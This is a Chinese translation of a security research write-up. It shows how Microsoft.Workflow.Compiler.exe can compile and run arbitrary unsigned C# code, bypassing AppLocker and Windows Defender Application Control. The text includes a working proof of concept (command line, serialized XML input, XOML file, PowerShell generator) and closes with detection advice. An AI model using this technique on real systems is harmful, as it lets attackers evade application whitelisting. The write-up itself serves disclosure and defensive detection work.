## 绕过技术简介

**Microsoft.Workflow.Comiler.exe是.NET
Framework默认自带的一个实用工具，用户能够以XOML工作流文件的形式提供一个序列化工作流来执行任意未签名的代码。这种绕过技术跟CaseySmith的[msbuild.exe绕过技术](https://web.archive.org/web/20161212224652/http:/subt0x10.blogspot.com/2016/09/bypassing-application-whitelisting.html)的工作机制非常类似。Microsoft.Workflow.Comiler.exe需要两个命令行参数，第一个参数必须是一个XML文件（由一个序列化CompilerInput对象构成）的路径，第二个参数则是写入序列化编译结果的文件路径。**

执行向量的根节点是Microsoft.Workflow.Comiler.exe调用攻击者提供的Assembly.Load(byte[])方法，但是仅仅加载编译文件并不能实现代码执行，当攻击者以XOML文件的形式提供C#或VB.Net代码时，系统在汇编过程中会调用类构造器，这里唯一的限制是类构造器必须派生自System.Workflow.ComponentModel.Activity类。

这种技术可以绕过目前很多安全产品上的代码完整性控制机制，例如WindowsDefender应用程序控制（包括Windows
10S）、AppLocker以及其他基于应用白名单的产品。但是这里我们并不是要担心如何绕过应用白名单，我们需要关注的是如何通过已签名且受信任程度高的内置应用程序来执行任意未签名的代码。

下面给大家提供了一个演示视频，在这个视频中我们会在最新版本的Windows 10S系统（已安装完所有更新补丁）上实现任意代码执行：

## 演示视频

## 绕过技术PoC

### 攻击流程如下：

1.将制作的XOML文件存储到目标磁盘中，XOML文件中应包含攻击者提供的C#或VB.Net代码以供编译、加载和调用。攻击逻辑需在类构造函数中实现，该类派生自System.Workflow.ComponetModel.Activity类。

2.将包含序列化CompilerInput对象的XML文件存储到目标磁盘中。

3.提供XML路径，执行Microsoft.Workflow.Comiler.exe。

下面给出的是Microsoft.Workflow.Comiler.exe的调用样例：

    
    
    C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exetest.xml results.xml

### test.xml文件的内容如下：

    
    
    <?xml version="1.0"encoding="utf-8"?>
    
    <CompilerInput xmlns:i="<http://www.w3.org/2001/XMLSchema-instance>"xmlns="<http://schemas.datacontract.org/2004/07/Microsoft.Workflow.Compiler>">
    
    <filesxmlns:d2p1="<http://schemas.microsoft.com/2003/10/Serialization/Arrays>">
    
    <d2p1:string>test.xoml</d2p1:string>
    
    </files>
    
    <parameters xmlns:d2p1="<http://schemas.datacontract.org/2004/07/System.Workflow.ComponentModel.Compiler>">
    
    <assemblyNamesxmlns:d3p1="<http://schemas.microsoft.com/2003/10/Serialization/Arrays>"xmlns="<http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler>"/>
    
    <compilerOptionsi:nil="true"xmlns="<http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler>"/>
    
    <coreAssemblyFileNamexmlns="<http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler>"></coreAssemblyFileName>
    
    <embeddedResourcesxmlns:d3p1="<http://schemas.microsoft.com/2003/10/Serialization/Arrays>"xmlns="<http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler>"/>
    
    <evidencexmlns:d3p1="<http://schemas.datacontract.org/2004/07/System.Security.Policy>"i:nil="true" xmlns="<http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler>"/>
    
    <generateExecutablexmlns="<http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler>">false</generateExecutable>
    
    <generateInMemoryxmlns="<http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler>">true</generateInMemory>
    
    <includeDebugInformationxmlns="<http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler>">false</includeDebugInformation>
    
    <linkedResourcesxmlns:d3p1="<http://schemas.microsoft.com/2003/10/Serialization/Arrays>"xmlns="<http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler>"/>
    
    <mainClass i:nil="true"xmlns="<http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler>"/>
    
    <outputNamexmlns="<http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler>"></outputName>
    
    <tempFiles i:nil="true"xmlns="<http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler>"/>
    
    <treatWarningsAsErrorsxmlns="<http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler>">false</treatWarningsAsErrors>
    
    <warningLevelxmlns="<http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler>">-1</warningLevel>
    
    <win32Resource i:nil="true"xmlns="<http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler>"/>
    
    <d2p1:checkTypes>false</d2p1:checkTypes>
    
    <d2p1:compileWithNoCode>false</d2p1:compileWithNoCode>
    
    <d2p1:compilerOptionsi:nil="true" />
    
    <d2p1:generateCCU>false</d2p1:generateCCU>
    
    <d2p1:languageToUse>CSharp</d2p1:languageToUse>
    
    <d2p1:libraryPathsxmlns:d3p1="<http://schemas.microsoft.com/2003/10/Serialization/Arrays>"i:nil="true" />
    
    <d2p1:localAssemblyxmlns:d3p1="<http://schemas.datacontract.org/2004/07/System.Reflection>"i:nil="true" />
    
    <d2p1:mtInfo i:nil="true"/>
    
    <d2p1:userCodeCCUsxmlns:d3p1="<http://schemas.datacontract.org/2004/07/System.CodeDom>"i:nil="true" />
    
    </parameters>
    
    </CompilerInput>

### test.xoml文件的内容如下：

    
    
    <SequentialWorkflowActivityx:Class="MyWorkflow" x:Name="MyWorkflow" xmlns:x="<http://schemas.microsoft.com/winfx/2006/xaml>"xmlns="<http://schemas.microsoft.com/winfx/2006/xaml/workflow>">
    
       <CodeActivity x:Name="codeActivity1" />
    
       <x:Code><![CDATA[
    
       public class Foo : SequentialWorkflowActivity {
    
        public Foo() {
    
                Console.WriteLine("FOOO!!!!");
    
           }
    
       }
    
       ]]></x:Code>
    
    </SequentialWorkflowActivity>

调用Microsoft.Workflow.Compiler.exe之后，它将会编译其中的C#代码、加载已编译的DLL、并调用“Foo”构造器。

## 漏洞的发现过程

我个人比较喜欢去研究关于.NET
Framework方法的安全问题，比如说其中一个不安全的方法就是Assembly.Load(byte[])。这里我选择使用[dnSpy工具](https://github.com/0xd4d/dnSpy)来进行扫描判断，并在System.Workflow.ComponentModel.Compiler.WorkflowCompilerInternal.Compile方法中找到了如下所示的代码段：

![2.png](https://image.3001.net/images/20180829/1535519320_5b862a5824f30.png!small)

分析GenerateLocalAssembly方法的工作流程之后，我发现这个方法最终会调用标准的.NET编译/加载方法【[相关资料](http://www.exploit-monday.com/2017/07/bypassing-device-guard-with-dotnet-methods.html)】：

![3.png](https://image.3001.net/images/20180829/1535519327_5b862a5f60a37.png!small)

仅仅加载一个汇编程序并不能实现任意代码执行，不过幸运的是，System.Workflow.ComponentModel.Compiler.XomlCompilerHelper.InternalCompileFromDomBatch方法会遍历所有已加载的汇编程序，然后实例化所有继承了System.Workflow.ComponentModel.Activity类的实例：

![4.png](https://image.3001.net/images/20180829/1535519341_5b862a6d6caaa.png!small)![5.png](https://image.3001.net/images/20180829/1535519341_5b862a6dcb058.png!small)

现在，我们几乎已经看到了任意代码执行的“希望了”，接下来我们需要弄清楚到底使用哪种代码格式，才能让程序的编译器接收输入数据以及XOML工作流文件。

当Microsoft.Workflow.Compiler.exe启动时，会将第一个参数传递给ReadCompilerInput方法，该方法接收到文件路径之后，会将其反序列化为CompilerInput对象：

![6.png](https://image.3001.net/images/20180829/1535519353_5b862a79002f3.png!small)

那么现在的问题就在于，如何才能生成序列化的CompilerInput对象呢？这里我找到了一个名叫Microsoft.Workflow.Compiler.CompilerWrapper.SerializeInputToWrapper的内部方法：

![7.png](https://image.3001.net/images/20180829/1535519360_5b862a80b6434.png!small)

我还专门编写了一个PowerShell函数来实现XML文件的自动生成：

    
    
    function New-CompilerInputXml {
    
    <#
    
    .SYNOPSIS
    
    Creates a an XML file consisting of aserialized CompilerInput object.
    
    .DESCRIPTION
    
    New-CompilerInputXml creates an XML fileconsisting of compiler options. This file is required as the first argument forMicrosoft.Workflow.Compiler.exe.
    
    .PARAMETER XOMLPath
    
    Specifies the path to the target XOMLfile. This can be a relative or absolute path. This path will be included inthe resulting XML file that New-CompilerInputXml outputs.
    
    .PARAMETER OutputPath
    
    Specifies the path to whichNew-CompilerInputXml will save the serialized CompilerInput object.
    
    .EXAMPLE
    
    New-CompilerInputXml -XOMLPathC:\Test\foo.xoml -OutputPath test.xml
    
    Outputs a serialized CompilerInput objectto test.xml and specifies a full path to a XOML assembly reference.
    
    .EXAMPLE
    
    New-CompilerInputXml -XOMLPath foo.xoml-OutputPath test.txt
    
    Outputs a serialized CompilerInput objectto test.txt and specifies a XOML assembly reference using a relative path. Notethat Microsoft.Workflow.Compiler.exe doesn't care about the extension suppliedin the first argument.
    
    .OUTPUTS
    
    System.IO.FileInfo
    
    Outputs a FileInfo object to serve asconfirmation that the resulting serialized XML wil was created.
    
    #>
    
     
    
       [OutputType([System.IO.FileInfo])]
    
       param (
    
           [String]
    
           [ValidateNotNullOrEmpty()]
    
           $XOMLPath = 'test.xoml',
    
     
    
           [Parameter(Mandatory = $True)]
    
           [String]
    
           [ValidateNotNullOrEmpty()]
    
           $OutputPath
    
       )
    
     
    
       # This assembly won't be loaded by default. We need to load
    
       # it in order to get access to the WorkflowCompilerParameters class.
    
       Add-Type -AssemblyName 'System.Workflow.ComponentModel'
    
     
    
       # This class contains the properties we need to specify forMicrosoft.Workflow.Compiler.exe
    
       $WFCompilerParams = New-Object -TypeNameWorkflow.ComponentModel.Compiler.WorkflowCompilerParameters
    
     
    
       # Necessary to get Microsoft.Workflow.Compiler.exe to callAssembly.Load(byte[])
    
       $WFCompilerParams.GenerateInMemory = $True
    
     
    
       # Full path to Microsoft.Workflow.Compiler.exe that we will load andaccess a non-public method from
    
       $WorkflowCompilerPath =[Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory() +'Microsoft.Workflow.Compiler.exe'
    
     
    
       # Load the assembly
    
       $WFCAssembly = [Reflection.Assembly]::LoadFrom($WorkflowCompilerPath)
    
     
    
       # This is the helper method that will serialize the CompilerInput objectto disk
    
       $SerializeInputToWrapper =[Microsoft.Workflow.Compiler.CompilerWrapper].GetMethod('SerializeInputToWrapper',[Reflection.BindingFlags] 'NonPublic, Static')
    
     
    
       $TempFile = $SerializeInputToWrapper.Invoke($null,@([Workflow.ComponentModel.Compiler.WorkflowCompilerParameters]$WFCompilerParams, [String[]] @(,$OutputPath)))
    
     
    
       Move-Item $TempFile $OutputPath -PassThru
    
    }

实际上我们只需要改变序列化CompilerInput对象中XOML文件的路径/文件名即可。

最后，我们需要将生成的C#代码嵌入到XOML文件中，最后通过Microsoft.Workflow.Compiler.exe来调用我们的恶意函数。

整个过程就是这样，不过我现在仍不清楚Microsoft.Workflow.Compiler.exe的真正用途到底是什么，而且XOML文件的意义我也不清楚，但是我感觉这个程序可能主要是给微软内部人员使用的。

## 检测方法

1.首先，检查当前系统中Microsoft.Workflow.Compiler.exe的使用情况，一般来说系统几乎不会用到这个工具。在Microsoft.Workflow.Compiler.exe每次运行时都产生警报，由于攻击者可以对该工具进行重命名，因此我们还需要构建[相应的检测规则](https://posts.specterops.io/what-is-it-that-makes-a-microsoft-executable-a-microsoft-executable-b43ac612195e) 。

2.攻击者在结合Microsoft.Workflow.Compiler.exe运行恶意软件时，会生成一个csc.exe或vbc.exe子进程，可以通过检测这两个子进程来判断系统的安全状况。

3.在构建和部署Yara规则时，如果文件中包含CompilerInput标签，那么该文件则可以标记为“可疑文件”。

针对上述的三种检测方法，我开发了一个Payload生成/测试工具，大家可以利用该工具来判断各自系统中安全检测方法的有效性：【[下载地址](https://gist.github.com/mattifestation/3e28d391adbd7fe3e0c722a107a25aba)】

 ***参考来源：[specterops](https://posts.specterops.io/arbitrary-unsigned-code-execution-vector-in-microsoft-workflow-compiler-exe-3d9294bc5efb)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**

